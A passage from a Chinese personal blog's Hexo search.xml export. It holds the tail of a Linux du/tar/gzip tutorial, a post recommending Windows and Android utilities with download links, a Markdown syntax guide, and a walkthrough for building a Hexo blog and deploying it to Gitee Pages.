<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh</span></span><br></pre></td></tr></table></figure>

<p><code>-s</code>是递归整个目录大小</p>
<p>查看当前文件夹下各个文件的大小：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh *</span></span><br></pre></td></tr></table></figure>

<h3 id="打包和压缩"><a href="#打包和压缩" class="headerlink" title="打包和压缩"></a>打包和压缩</h3><p> 打包是指将几个文件或目录变成一个总的文件，压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 </p>
<ul>
<li><p>打包</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>产生新的包</td>
</tr>
<tr>
<td>-f</td>
<td>指定包的文件名</td>
</tr>
<tr>
<td>-r</td>
<td>指定新文件加入到包中</td>
</tr>
<tr>
<td>-t</td>
<td>列出包中文件</td>
</tr>
<tr>
<td>-u</td>
<td>更新包中某个文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示进度</td>
</tr>
</tbody></table>
<p>例如：打包当前文件夹下所有的<code>txt</code>文件并显示进度：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvf new.tar *.txt</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>压缩：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gzip new.tar</span></span><br></pre></td></tr></table></figure>

<p>将会生成<code>new.tar.gz</code>的文件。</p>
</li>
</ul>
<p>也可以一条命令将文件打包并压缩：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvzf one.tar.gz *.txt</span></span><br></pre></td></tr></table></figure>

<p>  <code>-z</code>是调用<code>gzip</code></p>
<h3 id="解压缩和解包"><a href="#解压缩和解包" class="headerlink" title="解压缩和解包"></a>解压缩和解包</h3><ul>
<li><p>解压缩</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gunzip one.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>解包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xf one.tar</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里同样支持一条命令将压缩包解压并解包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xzf one.tar.gz</span></span><br></pre></td></tr></table></figure>

<p>除了<code>gzip</code>，还可以用<code>bz2</code>。用法如下：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>调用方式</th>
<th>对应压缩包文件</th>
</tr>
</thead>
<tbody><tr>
<td>gzip</td>
<td>-z</td>
<td>.gz</td>
</tr>
<tr>
<td>bzip2</td>
<td>-j</td>
<td>.bz2</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>小工具分享</title>
    <url>/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="windows端"><a href="#windows端" class="headerlink" title="windows端"></a>windows端</h2><h4 id="BandicamPortable"><a href="#BandicamPortable" class="headerlink" title="- BandicamPortable"></a>- BandicamPortable</h4><p>这是一款号称是录制游戏视频的录屏软件，但是它的功能不仅仅与录制视频，只要是需要录制视频的地方，它都可以胜任，软件提供五种录制模式。这款工具具有的这几个功能让我觉得它非常友好:<br><img src="https://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184319.png" alt></p>
<ol>
<li>可以设置鼠标效果；许多人录制视频的时候都知道，要是自己的显示器比较大，光标就会显得很小，我们的鼠标的轨迹就会不明显，这款软件恰好可以解决这个问题。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184810.png" alt></li>
<li>实时笔记；在我们录制的过程当中，我们可以用鼠标进行写字，也可以输入文字。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195959.png" alt></li>
<li>游戏录制模式；如果我们选了该模式，那么我们可以在视频的适当位置显示实时帧率FPS，对于轻度游戏评测者比较方便。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223193217.png" alt><br>这个软件可以配合另一个小工具来使用：KeyCastOW，它可以实时监听键盘和鼠标的触发变化，并在屏幕上显示，对于一些游戏教程者，比如QQ飞车漂移教程者来说非常友好<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223200552.png" alt><br><a href="https://www.bandicam.cn/" target="_blank" rel="noopener">这是BandicamPortable的官网</a><br><a href="bdcamsetup.exe">也可以点我下载</a><br><a href="KeyCastOW_jb51.rar">KeyCastOW下载</a></li>
</ol>
<h4 id="TrafficMonitor"><a href="#TrafficMonitor" class="headerlink" title="- TrafficMonitor"></a>- TrafficMonitor</h4><p>这是一个实时显示系统信息的工具，能显示cpu和内存的使用以及上传下载的状态，对于我这种总是忍不住要看网速和内存使用状态的强迫症来说简直不要太爽</p>
<p><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223194705.png" alt><br><a href="TrafficMonitor.rar">点我下载</a></p>
<h4 id="memreduct"><a href="#memreduct" class="headerlink" title="- memreduct"></a>- memreduct</h4><p>这是一款监控内存的工具，和TrafficMonitor不同的是，memreduct可以进行内存清理，我们可以手动清理加速，也可以设置阈值，当使用内存超过一定时自动清理内存，或者设定每隔一定的时间就清理<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195151.png" alt><br><a href="memreduct.rar">点我下载</a></p>
<h2 id="安卓端"><a href="#安卓端" class="headerlink" title="安卓端"></a>安卓端</h2><h4 id="Via浏览器"><a href="#Via浏览器" class="headerlink" title="- Via浏览器"></a>- Via浏览器</h4><p>一款极其简约的浏览器，是我目前遇到的最简约的浏览器了，而且很轻量，体积不足1MB，但是浏览器该有的功能都有了，支持的插件和脚本也很多，还有一套完美的广告拦截系统<br><img src="http://q.yalexin.top/C545427C9BA0FD672C6613D78A453B19.jpg" alt><br>这是它的 <a href="http://via-app.cn/#/tabBar/home" target="_blank" rel="noopener">插件网</a><br><img src="http://q.yalexin.top/EEC02EAC3A94AC48D266FF52C217D5DD.jpg" alt><br><a href="http://viayoo.com/zh-cn/" target="_blank" rel="noopener">Via官网</a><br>也可以<a href="Via.apk">点此下载</a></p>
<h4 id="Dir"><a href="#Dir" class="headerlink" title="- Dir"></a>- Dir</h4><p>这是一款垃圾清理的工具，真就是除了清理垃圾就没有其他臃肿的功能了<br><img src="http://q.yalexin.top/4888C591C6EB238D6CA5A29EC99B5957.jpg" alt><br>好吧，原来是我没有看清除（qiong），高级版的功能还是相当不错的，可以有效防止国内一些流氓软件了，不过该功能要谨慎使用，否则误删了系统文件而且导致系统崩溃<br><img src="http://q.yalexin.top/3AB2908779F1FBAE43E5B3B7B938DD68.jpg" alt><br>这是Google Play <a href="https://play.google.com/store/apps/details?id=kh.android.dir" target="_blank" rel="noopener">链接</a><br>也可以<a href="Dir.apk">点此下载</a></p>
<h4 id="Snapmod"><a href="#Snapmod" class="headerlink" title="- Snapmod"></a>- Snapmod</h4><p>这是一款把截图带上手机边框的软件,原理就是将截图按照一定的比例进行缩放,也正因为如此,安装应用后第一件事就是下载自己手机对应的机型<br><img src="http://q.yalexin.top/1A5A0DBD71AABBFFB7F1A49D81126DAA.jpg" alt><br>如果找不到的话就以自己的手机屏幕分辨率为基础,按照自己的爱好选择现有的机型下载,不过现在适配的机型也挺多的</p>
<img src="/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/0377AFF02DAA787A7579289E2A11626F.jpg" class>
<p>** 不过要注意,假如强行选用非自己手机分辨率的机型,会造成图片变形 **<br>这是Snapmod的<a href="https://coolapk.com/apk/cn.gavinliu.snapmod" target="_blank" rel="noopener">酷安链接</a><br>也可以<a href="Snapmod.apk">点此下载</a></p>
<h4 id="网速指示计"><a href="#网速指示计" class="headerlink" title="- 网速指示计"></a>- 网速指示计</h4><p>不过说实话这款应用对于华为、小米、OPPO、VIVO等手机可能不太适用,因为这些手机厂商的系统基于Android系统上都自带实时网速的功能,所以这款应用适用于运行原生安卓或者自身系统不带网速显示的手机<br><img src="http://q.yalexin.top/0377AFF02DAA787A7579289E2A11626F.jpg" alt><br>这是Google Play <a href="https://play.google.com/store/apps/details?id=me.zheteng.android.powerstatus" target="_blank" rel="noopener">链接</a><br>也可以<a href="网速指示计.apk">点此下载</a>网速指示计.apk)</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>效率</tag>
        <tag>分享</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown的相关语法</title>
    <url>/2020/02/23/markdown%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Markdown是一种可以使用普通文本编辑器编写的<a href="https://baike.baidu.com/item/标记语言/5964436" target="_blank" rel="noopener">标记语言</a>，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p>
<p>Markdown具有一系列衍生版本，用于扩展Markdown的功能（如表格、脚注、内嵌HTML等等），这些功能原初的Markdown尚不具备，它们能让Markdown转换成更多的格式，例如LaTeX，Docbook。Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 Maruku等。这些衍生版本要么基于工具，如Pandoc；要么基于网站，如GitHub和Wikipedia，在语法上基本兼容，但在一些语法和渲染效果上有改动。</p>
<p>Markdown文件后期可以转换成html文件，所以在md文件中直接使用html语言也是可以的</p>
<h2 id="语法介绍"><a href="#语法介绍" class="headerlink" title="语法介绍"></a>语法介绍</h2><h3 id="1-标题（注意，许多地方一定不要忘了加空格）"><a href="#1-标题（注意，许多地方一定不要忘了加空格）" class="headerlink" title="1.标题（注意，许多地方一定不要忘了加空格）"></a>1.标题（注意，许多地方一定不要忘了加空格）</h3><p>标题的格式为 “#”+空格+标题名，其中“#”的个数代表这是几级标题，但是最多只能有6级标题</p>
 <a id="more"></a> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">### 三级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">####### 这是一个错误的写法</span><br></pre></td></tr></table></figure>
<p>上面的代码等效于</p>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p>####### 这是一个错误的写法</p>
<hr>
<h3 id="2-字体"><a href="#2-字体" class="headerlink" title="2.字体"></a>2.字体</h3><ul>
<li>斜体：在欲显示斜体内容的两头加“*”</li>
<li>加粗：在欲显示加粗内容的两头加“**”</li>
<li>粗斜体：在欲显示粗斜体内容的两头加“***”<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*这是斜体*</span><br><span class="line">**这是粗体**</span><br><span class="line">***这是粗斜体***</span><br></pre></td></tr></table></figure>
上面的代码等效于</li>
</ul>
<p><em>这是斜体</em><br><strong>这是粗体</strong><br><strong><em>这是粗斜体</em></strong></p>
<ul>
<li><p>进阶使用</p>
<p>指定字体：</p>
<pre><code>&lt;font face=&quot;黑体&quot;&gt;黑体字&lt;/font&gt;
&lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt;</code></pre><p>指定大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font size&#x3D;20&gt;大小&#x3D;20&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>

<p>指定颜色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font color&#x3D;#ff0000&gt;红色&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="3-列表"><a href="#3-列表" class="headerlink" title="3.列表"></a>3.列表</h3><ul>
<li><p>无序列表<br>“-”+空格+项目名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 项目一</span><br><span class="line">- 项目二</span><br></pre></td></tr></table></figure>
</li>
<li><p>有序列表<br>数字+“.”+空格+项目名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 项目三</span><br><span class="line">2. 项目四</span><br></pre></td></tr></table></figure>

<p>上面代码等效于</p>
<ul>
<li>项目一</li>
<li>项目二</li>
</ul>
<ol>
<li><p>项目三</p>
</li>
<li><p>项目四</p>
</li>
</ol>
</li>
</ul>
<h3 id="4-表格"><a href="#4-表格" class="headerlink" title="4.表格"></a>4.表格</h3><p>第一行是用“|”分开的表头<br>第二行是每一列的对齐方式，“:”在“-”的左边是左对齐，在右边是右对齐，没有“:”则默认是左对齐<br>第三行开始每一单元格用“|”分开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|上午|下午|晚上|</span><br><span class="line">|:-|:-:|-:|</span><br><span class="line">|写BUG(左对齐)|查BUG(居中对齐)|改BUG(右对齐)|</span><br><span class="line">| 写BUG(左对齐) | 查BUG(居中对齐) | 改BUG(右对齐) |</span><br></pre></td></tr></table></figure>

<p>上面的代码等价于</p>
<table>
<thead>
<tr>
<th align="left">上午</th>
<th align="center">下午</th>
<th align="right">晚上</th>
</tr>
</thead>
<tbody><tr>
<td align="left">写BUG(左对齐)</td>
<td align="center">查BUG(居中对齐)</td>
<td align="right">改BUG(右对齐)</td>
</tr>
<tr>
<td align="left">写BUG(左对齐)</td>
<td align="center">查BUG(居中对齐)</td>
<td align="right">改BUG(右对齐)</td>
</tr>
</tbody></table>
<h3 id="5-超链接"><a href="#5-超链接" class="headerlink" title="5.超链接"></a>5.超链接</h3><p>超链接的格式为：[描述]+(url)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[这是一个超链接](http:&#x2F;&#x2F;ruixin_huang.gitee.io&#x2F;mblog&#x2F;)</span><br></pre></td></tr></table></figure>
<p>上面的代码等价于<br><a href="https://yalexin.gitee.io">这是一个超链接</a></p>
<h3 id="6-图片"><a href="#6-图片" class="headerlink" title="6.图片"></a>6.图片</h3><p>可以这样子引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![这是一张网络图片](https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot;网络图片&quot;)</span><br></pre></td></tr></table></figure>
<p>上面代码等效于<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7" alt="这是一张网络图片，随着时间流逝链接有可能失效"><br>当然了，如果我们想要修改图片属性也是可以的，不过是要写成html格式的<br>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot; width&#x3D;500&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码等价于<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7 " width="500/"><br>在hexo中，我们可以利用下面的方法显示本地图片</p>
<ol>
<li><p>在博客根目录下的_config.yml文件中，把post_asset_folder属性改为true，这样子我们每次用new指令新建文章的时候，hexo就会自动在文章所在目录下生成一个与文章同名的文件夹，我们只需要在该文件夹下放置我们所需要显示的图片资源文件</p>
</li>
<li><p>在需要显示图片的地方输入以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 图片名加文件后缀 图片描述(可省) %&#125;</span><br></pre></td></tr></table></figure>
<p>如</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 317325.jpg 这是一张本地图片文件 %&#125;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<img src="/2020/02/23/markdown%E8%AF%AD%E6%B3%95/317325.jpg" class title="这是一张本地图片文件">

<p>也可以借助七牛云图床，将我们的图片上传后引用图片的链接。</p>
<h3 id="7-代码块"><a href="#7-代码块" class="headerlink" title="7.代码块"></a>7.代码块</h3><p>代码的格式是用三个反引号将代码包起来，并且这三个反引号要分别独占一行<br>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(```)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"这是一段没有BUG的代码"</span>);</span><br><span class="line">(```)</span><br></pre></td></tr></table></figure>
<p>上面代码等效于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"这是一段没有BUG的代码"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="8-分割线"><a href="#8-分割线" class="headerlink" title="8.分割线"></a>8.分割线</h3><p>用三个或者三个以上的“-”或者“*”都可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br></pre></td></tr></table></figure>
<hr>
<hr>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Hexo博客并部署到码云</title>
    <url>/2020/02/22/%E5%8F%91%E5%B8%83%E5%8D%9A%E6%96%87/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我为什么要搭建博客？说实话我个人记忆力比较差，学过的东西经常会很快忘记，我自己又不爱做笔记，况且假如写在了笔记本上，笔记本又会被我弄丢，所以想到了把学过的东西记在博客上这种方法，但是我又不会web开发，刚好在别的地方了解到有hexo等的开源博客框架，心血来潮，趁着放寒假的时间就搭建了起来。</p>
<h2 id="下载安装Node-js"><a href="#下载安装Node-js" class="headerlink" title="下载安装Node.js"></a>下载安装Node.js</h2><p>从<a href="https://nodejs.org/en/" target="_blank" rel="noopener">官网</a>下载安装，安装完毕后在终端输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<p>假如出现版本号则说明安装成功，否则需要手动在系统的环境变量下的Path的值中添加node的安装路径。</p>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>这个步骤应该不难，网上的教程实在是太多太详细了。</p>
<h2 id="安装hexo相关文件："><a href="#安装hexo相关文件：" class="headerlink" title="安装hexo相关文件："></a>安装hexo相关文件：</h2><p>在一个你喜欢的地方，新建一个文件夹，最好这个路径不要包含中文路径，在cmd窗口输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<h2 id="初始化博客文件夹："><a href="#初始化博客文件夹：" class="headerlink" title="初始化博客文件夹："></a>初始化博客文件夹：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>
<h2 id="进入博客文件夹："><a href="#进入博客文件夹：" class="headerlink" title="进入博客文件夹："></a>进入博客文件夹：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br></pre></td></tr></table></figure>
 <a id="more"></a> 

<h2 id="安装插件："><a href="#安装插件：" class="headerlink" title="安装插件："></a>安装插件：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h2 id="新建一篇文章命令："><a href="#新建一篇文章命令：" class="headerlink" title="新建一篇文章命令："></a>新建一篇文章命令：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new "My New Post"</span><br></pre></td></tr></table></figure>

<h2 id="启动服务预览"><a href="#启动服务预览" class="headerlink" title="启动服务预览"></a>启动服务预览</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>然后在本地浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ，如果一切顺利，那么就可以出现你的博客了。</p>
<h2 id="部署到第三方平台"><a href="#部署到第三方平台" class="headerlink" title="部署到第三方平台"></a>部署到第三方平台</h2><p>当然了，我们自己的博客不仅仅是想让自己看，还想着通过网络，让更多的人看到，我们就可以借助第三方平台的page服务来展示我们的静态网站了，你可以通过GitHub，码云，coding等，我这里用来码云。</p>
<h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>注册好码云后，新建一个仓库，将仓库的地址（可以是HTTPS形式的，也可以是SSH形式的，我的是https）复制，打开博客文件夹下的_config.yml文件（theme/theme_name/下也有一个，不要混淆），将刚刚复制好的地址粘贴到gitee的值，并在后面加上master分支：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span>  </span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/xxxxx/xxxx.git,master</span></span><br></pre></td></tr></table></figure>

<h3 id="与远程仓库连接"><a href="#与远程仓库连接" class="headerlink" title="与远程仓库连接"></a>与远程仓库连接</h3><p>在刚刚打开的文件夹中打开cmd终端，输入下面命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name空格+你的码云的名字</span><br><span class="line">git config --global user.email空格+你的码云绑定的邮箱</span><br></pre></td></tr></table></figure>

<h3 id="安装Git部署插件"><a href="#安装Git部署插件" class="headerlink" title="安装Git部署插件"></a>安装Git部署插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>生成静态网页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p>推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>接着到码云平台，打开你刚刚建好的仓库，如果仓库里边出现新的东西，说明部署成功了，接着我们依次点击 服务-&gt;gite pages -&gt; 开启，然后打开平台给我们的网址，就可以访问我们的博客啦！</p>
<p>后期可以通过更换主题来增加美观度，主题可以在<a href="https://hexo.io/" target="_blank" rel="noopener">hexo官网</a>下载，也可以在GitHub下载，下载后在博客目录下的配置文件_config.yml中修改主题的名字</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="comment"># your theme name</span></span><br></pre></td></tr></table></figure>


<p>并将你下载的主题文件夹放到博客目录下的themes文件夹中就可以了。</p>
<p>部署完毕，那我们如何编写文章？用普通文本编辑器？用HTML文件编写？其实，最方便的是使用.md文件编写，关于如何使用.md文件，请看<a href="https://yalexin.gitee.io/2020/02/23/markdown语法/">这里</a> </p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
</search>
